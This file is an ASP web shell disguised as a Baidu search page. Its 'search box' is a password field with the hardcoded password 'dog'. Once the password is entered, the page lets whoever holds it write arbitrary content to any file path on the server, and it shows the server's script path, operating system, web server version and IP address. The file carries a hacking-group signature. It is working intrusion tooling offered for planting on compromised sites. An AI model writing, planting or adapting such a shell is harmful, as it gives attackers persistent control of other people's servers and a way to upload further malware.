<%
on error resume next
%>
<%
  if request("pass")="dog" then
  session("pw")="go"
  end if
%>
<%if session("pw")<>"go" then %>
<%="<center><br><form action='' method='post'>"%>
<%="<center><img src=http://www.baidu.com/img/baidu_logo.gif width=270 height=129>"%>
<%="<br>"%>
<%="<font color='#0000FF'><a href=http://www.hake.cc>新 闻</a>  <a href=http://www.hake.cc>网 页</a>  <a href=http://www.hake.cc>贴 吧</a>  <a href=http://www.hake.cc>知 道</a>  <a href=http://www.hake.cc>MP3</a>  <a href=http://www.hake.cc>图 片</a>  <a href=http://www.hake.cc>视 频</a></font>"%>
<%="<br><br>"%>
<%="<input name='pass' type='password' size='33'> <input "%><%="type='submit' value='百度一下'></center>"%>
<%="<br><br><br>"%>
<%="<span style='border-bottom:#0000FF solid 1px;'><font color='#0000FF'><a href=http://www.hake.cc>哈客部落|残剑专用</a></font></span>"%>
<%="<br><br><br>"%>
<%="<span style='border-bottom:#0000FF solid 1px;'><font size=2 color='#0000FF'><a href=http://www.baidu.cn>把百度设为主页</a></font></span>"%>
<%else%>
<%
set fso=server.createobject("scripting.filesystemobject")
path=request("path")
if path<>"" then
data=request("da")
set da=fso.createtextfile(path,true)
da.write data
if err=0 then
%>
<%="yes"%>
<%else%>
<%="no"%>
<%
end if
err.clear
end if
da.close
%>
<%set da=nothing%>
<%set fos=nothing%>
<%="<form action='' method=post>"%>
<%="<input type=text name=path>"%>
<%="<br>"%>
<%="当前文件路径:"&server.mappath(request.servervariables("script_name"))%>
<%="<br>"%>
<%="操作系统为:"&Request.ServerVariables("OS")%>
<%="<br>"%>
<%="WEB服务器版本为:"&Request.ServerVariables("SERVER_SOFTWARE")%>
<%="<br>"%>
<%="服务器的IP为:"&Request.ServerVariables("LOCAL_ADDR")%>
<%="<br>"%>
<%="<textarea name=da cols=50 rows=10 width=30></textarea>"%>
<%="<br>"%>
<%="<input type=submit value=save>"%>
<%="</form>"%>
<%end if%>
